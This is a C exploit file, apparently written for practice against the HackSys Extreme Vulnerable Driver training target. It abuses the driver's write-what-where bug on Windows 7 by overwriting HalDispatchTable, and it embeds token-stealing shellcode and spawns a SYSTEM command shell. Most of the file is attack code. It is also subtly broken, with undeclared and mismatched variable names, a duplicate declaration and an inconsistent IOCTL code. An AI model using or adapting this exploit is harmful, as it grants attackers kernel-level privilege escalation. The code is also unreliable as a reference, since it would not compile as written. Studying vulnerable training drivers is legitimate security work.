
/*
NTSTATUS TriggerArbitraryOverwrite(IN PWRITE_WHAT_WHERE UserWriteWhatWhere) {
    NTSTATUS Status = STATUS_SUCCESS;
 
    PAGED_CODE();
 
    __try {
        // Verify if the buffer resides in user mode
        ProbeForRead((PVOID)UserWriteWhatWhere,
                     sizeof(WRITE_WHAT_WHERE),
                     (ULONG)__alignof(WRITE_WHAT_WHERE));
 
        DbgPrint("[+] UserWriteWhatWhere: 0x%p\n", UserWriteWhatWhere);
        DbgPrint("[+] WRITE_WHAT_WHERE Size: 0x%X\n", sizeof(WRITE_WHAT_WHERE));
        DbgPrint("[+] UserWriteWhatWhere->What: 0x%p\n", UserWriteWhatWhere->What);
        DbgPrint("[+] UserWriteWhatWhere->Where: 0x%p\n", UserWriteWhatWhere->Where);
 
#ifdef SECURE
        // Secure Note: This is secure because the developer is properly validating if address
        // pointed by 'Where' and 'What' value resides in User mode by calling ProbeForRead()
        // routine before performing the write operation
        ProbeForRead((PVOID)UserWriteWhatWhere->Where,
                     sizeof(PULONG),
                     (ULONG)__alignof(PULONG));
        ProbeForRead((PVOID)UserWriteWhatWhere->What,
                     sizeof(PULONG),
                     (ULONG)__alignof(PULONG));
 
        *(UserWriteWhatWhere->Where) = *(UserWriteWhatWhere->What);
#else
        DbgPrint("[+] Triggering Arbitrary Overwrite\n");
 
        // Vulnerability Note: This is a vanilla Arbitrary Memory Overwrite vulnerability
        // because the developer is writing the value pointed by 'What' to memory location
        // pointed by 'Where' without properly validating if the values pointed by 'Where'
        // and 'What' resides in User mode
        *(UserWriteWhatWhere->Where) = *(UserWriteWhatWhere->What);
#endif
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }
 
    return Status;
}

'''
The driver takes two pointers, one shows what the driver
will write to memory and one which provides the location
where the driver will write. Again, great job on showing
the vulnerability and what would have been the secure implementation.
The issue here is that the driver does not validate that the location
of the destination pointer is in userland,
because of this we can overwrite an arbitrary Kernel address (4-bytes) with and arbitrary value (4-bytes).
'''

<-----------------
To Put it simply The driver lets has write arbitrary data to an arbitrary location.
(of limited size), to exploit (on win-7) we overwrite a kernel pointer inside HalDispatchTable, to call
NtQueryIntervalProfile in order to get code execution.
---------------->
	
*/

#include <Windows.h>
#include <string.h>
#include <stdio.h>
#include <winioctl.h>
#include <stdint.h>
#include <malloc.h>

typedef NTSTATUS(__stdcall *pNtQueryIntervalProfile)(
	ULONG ProfileSource,
	PULONG Interval
);

typedef NTSTATUS(__stdcall *pfZwQuerySystemInformation)(
		SYSTEM_INFORMATION_CLASS SystemInformationClass,
		PVOID SystemInformation,
		ULONG SystemInformationLength,
		PULONG ReturnLength
);

#pragma comment(lib,"ntdll.lib")

FARPROC GetAddress(LPCSTR Sym)
{
	typedef enum _SYSTEM_INFORMATION_CLASS {
		SystemBasicInformation = 0,
		SystemPerformanceInformation = 2,
		SystemTimeOfDayInformation = 3,
		SystemProcessInformation = 5,
		SystemProcessorPerformanceInformation = 8,
		SystemModuleInformation = 11,
		SystemInterruptInformation = 23,
		SystemExceptionInformation = 33,
		SystemRegistryQuotaInformation = 37,
		SystemLookasideInformation = 45
	} SYSTEM_INFORMATION_CLASS;

	
	typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
		HANDLE Section;
		PVOID MappedBase;
		PVOID ImageBase;
		ULONG ImageSize;
		ULONG Flags;
		USHORT LoadOrderIndex;
		USHORT InitOrderIndex;
		USHORT LoadCount;
		USHORT OffsetToFileName;
		UCHAR FullPathName[256];
	} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

	typedef struct _SYSTEM_MODULE_INFORMATION {
		ULONG NumberOfModules;
		SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
	} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

	typedef NTSTATUS(NTAPI *_NtQuerySystemInformation)(
		SYSTEM_INFORMATION_CLASS SystemInformationClass,
		PVOID SystemInformation,
		ULONG SystemInformationLength,
		PULONG ReturnLength
	);

	DWORD l;
	PSYSTEM_MODULE_INFORMATION Mi;
	LPVOID kBase = NULL;
	PUCHAR kImage = NULL;
	HMODULE UKrnl;
	FARPROC KSymb = NULL;
	FARPROC Add = NULL;
	LPCSTR KName = NULL;


	pfZwQuerySystemInformation ZwQuerySystemInformation = (pfZwQuerySystemInformation)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "ZwQuerySystemInformation");

	ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &l);
	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(
		NULL, len, MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);

	ZwQuerySystemInformation(SystemModuleInformation, ModuleInfo, l, &l);

	kBase = ModuleInfo->Module[0].ImageBase;
	kImage = ModuleInfo->Module[0].FullPathName;

	KName = (LPCSTR)(Mi->Module[0].FullPathName + ModuleInfo->Module[0].OffsetToFileName);

	UKrnl = LoadLibraryExA(lpKernelName, 0, 0);

	KSym = GetProcAddress(Ukrnl, lpSymbolName);
	Add = (FARPROC)((PUCHAR)pUserKernelSymbol - (PUCHAR)UKrnl + (PUCHAR)kBase);

	FreeLibrary(UKrnl);
	VirtualFree(Mi, 0, MEM_RELEASE);

	return Add;
}

#define ioctl CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)

int main()
{
	CHAR win7x86pl[] = "\x60"
		"\x64\xA1\x24\x01\x00\x00"
		"\x8B\x40\x50"
		"\x89\xC1"
		"\x8B\x98\xF8\x00\x00\x00"
		"\xBA\x04\x00\x00\x00"
		"\x8B\x80\xB8\x00\x00\x00"
		"\x2D\xB8\x00\x00\x00"
		"\x39\x90\xB4\x00\x00\x00"
		"\x75\xED"
		"\x8B\x90\xF8\x00\x00\x00"
		"\x89\x91\xF8\x00\x00\x00"
		"\x61"
		"\xC3"
		;

	HANDLE dev = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		NULL,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL
	);
	if (dev == INVALID_HANDLE_VALUE) {
		return -1;
	}
	LPVOID payload_ptr = NULL;
	LPCSTR Hal = "HalDispatchTable";
	FARPROC Where = NULL;
	LPVOID TargetAddress = NULL;
	LPVOID pl = VirtualAlloc(
		0,
		sizeof(win7x86pl),
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE
	);
	memcpy(pl, win7x86pl, sizeof(win7x86pl));
	LPVOID TargetAddress = (LPVOID)malloc(sizeof(LPVOID));
	TargetAddress = &pl;
	Where = GetAddress(Hal);
	Write = (LPVOID)((ULONG)TargetAddress + 0x4);
	auto Buff = (PUCHAR)malloc(sizeof(PUCHAR) * 2);
	memcpy(Buff, &Write, 4);
	memcpy(Buff + 4, &Where, 4);
	DWORD u = 0;                   

	auto bResult = DeviceIoControl(
		dev,	
		0x22200B,			
		chOverwriteBuffer, 8,		
		NULL, 0,		
		&u,			
		(LPOVERLAPPED)NULL
	);	

	pNtQueryIntervalProfile NtQueryIntervalProfile = (pNtQueryIntervalProfile)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryIntervalProfile");
	NtQueryIntervalProfile(0xa77b, &u);
	system("cmd.exe");
	CloseHandle(dev);
	system("pause");
	return 0;
}

